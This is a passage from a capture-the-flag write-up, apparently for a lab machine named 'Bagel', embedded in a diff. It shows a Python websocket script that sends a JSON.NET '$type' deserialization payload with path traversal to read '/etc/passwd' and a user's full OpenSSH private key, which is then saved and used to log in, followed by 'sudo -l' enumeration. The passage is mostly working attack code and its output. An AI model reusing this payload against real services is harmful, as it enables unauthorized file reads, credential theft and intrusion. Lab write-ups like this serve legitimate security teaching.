+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">websocket</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">order</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="o">:</span> <span class="err">#</span> <span class="nx">don</span><span class="err">&#39;</span><span class="nx">t</span> <span class="nx">forget</span> <span class="nx">to</span> <span class="nx">run</span> <span class="nx">the</span> <span class="nx">order</span> <span class="nx">app</span> <span class="nx">first</span> <span class="kd">with</span> <span class="s2">&#34;dotnet &lt;path to .dll&gt;&#34;</span> <span class="nx">command</span><span class="p">.</span> <span class="nx">Use</span> <span class="nx">your</span> <span class="nx">ssh</span> <span class="nx">key</span> <span class="nx">to</span> <span class="nx">access</span> <span class="nx">the</span> <span class="nx">machine</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ws</span> <span class="o">=</span> <span class="nx">websocket</span><span class="p">.</span><span class="nx">WebSocket</span><span class="p">()</span>    
+</span></span><span class="line"><span class="cl">        <span class="nx">ws</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="s2">&#34;ws://10.10.11.201:5000/&#34;</span><span class="p">)</span> <span class="err">#</span> <span class="nx">connect</span> <span class="nx">to</span> <span class="nx">order</span> <span class="nx">app</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">order</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;ReadOrder&#34;</span><span class="o">:</span><span class="nx">data</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">data</span> <span class="o">=</span> <span class="nx">str</span><span class="p">(</span><span class="nx">json</span><span class="p">.</span><span class="nx">dumps</span><span class="p">(</span><span class="nx">order</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">result</span> <span class="o">=</span> <span class="nx">ws</span><span class="p">.</span><span class="nx">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">(</span><span class="nx">json</span><span class="p">.</span><span class="nx">loads</span><span class="p">(</span><span class="nx">result</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">except</span> <span class="nx">Exception</span> <span class="nx">as</span> <span class="nx">E</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">print</span><span class="p">(</span><span class="nx">E</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">(</span><span class="s2">&#34;Unable to connect&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">print</span><span class="p">(</span><span class="nx">order</span><span class="p">(</span><span class="s2">&#34;orders.txt&#34;</span><span class="p">))</span>
+</span></span></code></pre></div><p>Running the script with different inputs for the <code>data</code> , it works quite well:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">python3</span> <span class="nx">interact_bagel</span><span class="p">.</span><span class="nx">py</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;UserId&#39;</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;Session&#39;</span><span class="o">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="s1">&#39;Time&#39;</span><span class="o">:</span> <span class="s1">&#39;8:20:01&#39;</span><span class="p">,</span> <span class="s1">&#39;RemoveOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;WriteOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;ReadOrder&#39;</span><span class="o">:</span> <span class="s1">&#39;Order not found!&#39;</span><span class="p">}</span> <span class="o">-</span> <span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">passwd</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">python3</span> <span class="nx">interact_bagel</span><span class="p">.</span><span class="nx">py</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;UserId&#39;</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;Session&#39;</span><span class="o">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="s1">&#39;Time&#39;</span><span class="o">:</span> <span class="s1">&#39;8:20:17&#39;</span><span class="p">,</span> <span class="s1">&#39;RemoveOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;WriteOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;ReadOrder&#39;</span><span class="o">:</span> <span class="s1">&#39;Order not found!&#39;</span><span class="p">}</span> <span class="o">-</span> <span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">.</span><span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">hosts</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">python3</span> <span class="nx">interact_bagel</span><span class="p">.</span><span class="nx">py</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;UserId&#39;</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;Session&#39;</span><span class="o">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="s1">&#39;Time&#39;</span><span class="o">:</span> <span class="s1">&#39;8:20:24&#39;</span><span class="p">,</span> <span class="s1">&#39;RemoveOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;WriteOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;ReadOrder&#39;</span><span class="o">:</span> <span class="s1">&#39;abc&#39;</span><span class="p">}</span> <span class="o">-</span> <span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="nx">orders</span><span class="p">.</span><span class="nx">txt</span>
+</span></span></code></pre></div><p>There is a method called <code>RemoveOrder</code> which does not have any objects defined in it like other methods</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_8.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>There was another class named as <code>File</code> containing a method called <code>ReadFile</code> which could be the perfect target for the attack as we can retrieve any arbitrary file:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_9.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Now, we can craft the payload as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;RemoveOrder&#34;</span><span class="o">:</span> <span class="p">{</span><span class="s2">&#34;$type&#34;</span><span class="o">:</span> <span class="s2">&#34;bagel_server.File, bagel&#34;</span><span class="p">,</span> <span class="s2">&#34;ReadFile&#34;</span><span class="o">:</span> <span class="nx">data</span><span class="p">}}</span>
+</span></span></code></pre></div><p><code>RemoveOrder</code> is one of the methods we can call, using the <code>$type</code> , we can specify <code>bagel_server.File, bagel</code> such as we will be calling a method from that specific location i.e. <code>ReadFile</code> , lastly the <code>data</code> is the argument for the <code>ReadFile</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3
+</span></span></span><span class="line"><span class="cl"><span class="ch"></span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">websocket</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">def</span> <span class="nx">order</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="o">:</span> <span class="err">#</span> <span class="nx">don</span><span class="err">&#39;</span><span class="nx">t</span> <span class="nx">forget</span> <span class="nx">to</span> <span class="nx">run</span> <span class="nx">the</span> <span class="nx">order</span> <span class="nx">app</span> <span class="nx">first</span> <span class="kd">with</span> <span class="s2">&#34;dotnet &lt;path to .dll&gt;&#34;</span> <span class="nx">command</span><span class="p">.</span> <span class="nx">Use</span> <span class="nx">your</span> <span class="nx">ssh</span> <span class="nx">key</span> <span class="nx">to</span> <span class="nx">access</span> <span class="nx">the</span> <span class="nx">machine</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ws</span> <span class="o">=</span> <span class="nx">websocket</span><span class="p">.</span><span class="nx">WebSocket</span><span class="p">()</span>    
+</span></span><span class="line"><span class="cl">        <span class="nx">ws</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="s2">&#34;ws://10.10.11.201:5000/&#34;</span><span class="p">)</span> <span class="err">#</span> <span class="nx">connect</span> <span class="nx">to</span> <span class="nx">order</span> <span class="nx">app</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">order</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;RemoveOrder&#34;</span><span class="o">:</span> <span class="p">{</span><span class="s2">&#34;$type&#34;</span><span class="o">:</span> <span class="s2">&#34;bagel_server.File, bagel&#34;</span><span class="p">,</span> <span class="s2">&#34;ReadFile&#34;</span><span class="o">:</span> <span class="nx">data</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">data</span> <span class="o">=</span> <span class="nx">str</span><span class="p">(</span><span class="nx">json</span><span class="p">.</span><span class="nx">dumps</span><span class="p">(</span><span class="nx">order</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">result</span> <span class="o">=</span> <span class="nx">ws</span><span class="p">.</span><span class="nx">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">(</span><span class="nx">json</span><span class="p">.</span><span class="nx">loads</span><span class="p">(</span><span class="nx">result</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">except</span> <span class="nx">Exception</span> <span class="nx">as</span> <span class="nx">E</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">print</span><span class="p">(</span><span class="nx">E</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">(</span><span class="s2">&#34;Unable to connect&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">print</span><span class="p">(</span><span class="nx">order</span><span class="p">(</span><span class="s2">&#34;../../../../../../../etc/passwd&#34;</span><span class="p">))</span>
+</span></span></code></pre></div><p>Checking it with the <code>/etc/passwd</code> , it worked like a charm</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">python3</span> <span class="nx">interact_bagel</span><span class="p">.</span><span class="nx">py</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;UserId&#39;</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;Session&#39;</span><span class="o">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="s1">&#39;Time&#39;</span><span class="o">:</span> <span class="s1">&#39;8:54:05&#39;</span><span class="p">,</span> <span class="s1">&#39;RemoveOrder&#39;</span><span class="o">:</span> <span class="p">{</span><span class="s1">&#39;$type&#39;</span><span class="o">:</span> <span class="s1">&#39;bagel_server.File, bagel&#39;</span><span class="p">,</span> <span class="s1">&#39;ReadFile&#39;</span><span class="o">:</span> <span class="s1">&#39;root❌0:0:root:/root:/bin/bash\nbin❌1:1:bin:/bin:/sbin/nologin\ndaemon❌2:2:daemon:/sbin:/sbin/nologin\nadm❌3:4:adm:/var/adm:/sbin/nologin\nlp❌4:7:lp:/var/spool/lpd:/sbin/nologin\nsync❌5:0:sync:/sbin:/bin/sync\nshutdown❌6:0:shutdown:/sbin:/sbin/shutdown\nhalt❌7:0:halt:/sbin:/sbin/halt\nmail❌8:12:mail:/var/spool/mail:/sbin/nologin\noperator❌11:0:operator:/root:/sbin/nologin\ngames❌12💯games:/usr/games:/sbin/nologin\nftp❌14:50:FTP User:/var/ftp:/sbin/nologin\nnobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin\ndbus❌81:81:System message bus:/:/sbin/nologin\ntss❌59:59:Account used for TPM access:/dev/null:/sbin/nologin\nsystemd-network❌192:192:systemd Network Management:/:/usr/sbin/nologin\nsystemd-oom❌999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin\nsystemd-resolve❌193:193:systemd Resolver:/:/usr/sbin/nologin\npolkitd❌998:997:User for polkitd:/:/sbin/nologin\nrpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\nabrt❌173:173::/etc/abrt:/sbin/nologin\nsetroubleshoot❌997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin\ncockpit-ws❌996:994:User for cockpit web service:/nonexisting:/sbin/nologin\ncockpit-wsinstance❌995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin\nrpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nsshd❌74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin\nchrony❌994:992::/var/lib/chrony:/sbin/nologin\ndnsmasq❌993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin\ntcpdump❌72:72::/:/sbin/nologin\nsystemd-coredump❌989:989:systemd Core Dumper:/:/usr/sbin/nologin\nsystemd-timesync❌988:988:systemd Time Synchronization:/:/usr/sbin/nologin\ndeveloper❌1000:1000::/home/developer:/bin/bash\nphil❌1001:1001::/home/phil:/bin/bash\n_laurel❌987:987::/var/log/laurel:/bin/false&#39;</span><span class="p">,</span> <span class="s1">&#39;WriteFile&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">},</span> <span class="s1">&#39;WriteOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;ReadOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">}</span>
+</span></span></code></pre></div><p>Next, we can get the private key of the <code>phil</code> user which we can use for SSH:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">python3</span> <span class="nx">interact_bagel</span><span class="p">.</span><span class="nx">py</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;UserId&#39;</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;Session&#39;</span><span class="o">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="s1">&#39;Time&#39;</span><span class="o">:</span> <span class="s1">&#39;8:55:19&#39;</span><span class="p">,</span> <span class="s1">&#39;RemoveOrder&#39;</span><span class="o">:</span> <span class="p">{</span><span class="s1">&#39;$type&#39;</span><span class="o">:</span> <span class="s1">&#39;bagel_server.File, bagel&#39;</span><span class="p">,</span> <span class="s1">&#39;ReadFile&#39;</span><span class="o">:</span> <span class="s1">&#39;-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----&#39;</span><span class="p">,</span> <span class="s1">&#39;WriteFile&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">},</span> <span class="s1">&#39;WriteOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">,</span> <span class="s1">&#39;ReadOrder&#39;</span><span class="o">:</span> <span class="nx">None</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">echo</span> <span class="s1">&#39;-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----&#39;</span> <span class="o">&gt;</span> <span class="nx">id_rsa_phil</span>
+</span></span></code></pre></div><p>Now, we can successfully login to the machine as <code>phil</code></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_10.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Now using the <code>dev</code> user’s password we got from the <code>DB</code> class of the <code>bagel.dll</code> , we can escalate to the <code>developer</code> user</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/Bagel_299b40e8bc344ae7904cea7a0b1ed5cf/Untitled_11.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Doing <code>sudo -l</code> , we can see that we are allowed to run <code>/usr/bin/donet</code> as user <code>root</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">developer</span><span class="err">@</span><span class="nx">bagel</span> <span class="o">~</span><span class="p">]</span><span class="nx">$</span> <span class="nx">sudo</span> <span class="o">-</span><span class="nx">l</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Matching</span> <span class="nx">Defaults</span> <span class="nx">entries</span> <span class="k">for</span> <span class="nx">developer</span> <span class="nx">on</span> <span class="nx">bagel</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="o">!</span><span class="nx">visiblepw</span><span class="p">,</span> <span class="nx">always_set_home</span><span class="p">,</span> <span class="nx">match_group_by_gid</span><span class="p">,</span> <span class="nx">always_query_group_plugin</span><span class="p">,</span> <span class="nx">env_reset</span><span class="p">,</span> <span class="nx">env_keep</span><span class="o">=</span><span class="s2">&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span><span class="p">,</span> <span class="nx">env_keep</span><span class="o">+=</span><span class="s2">&#34;MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span><span class="p">,</span> <span class="nx">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_COLLATE
+</span></span></span><span class="line"><span class="cl"><span class="s2">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span><span class="p">,</span> <span class="nx">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span><span class="p">,</span> <span class="nx">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">secure_path</span><span class="o">=</span><span class="err">/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">User</span> <span class="nx">developer</span> <span class="nx">may</span> <span class="nx">run</span> <span class="nx">the</span> <span class="nx">following</span> <span class="nx">commands</span> <span class="nx">on</span> <span class="nx">bagel</span><span class="o">:</span>
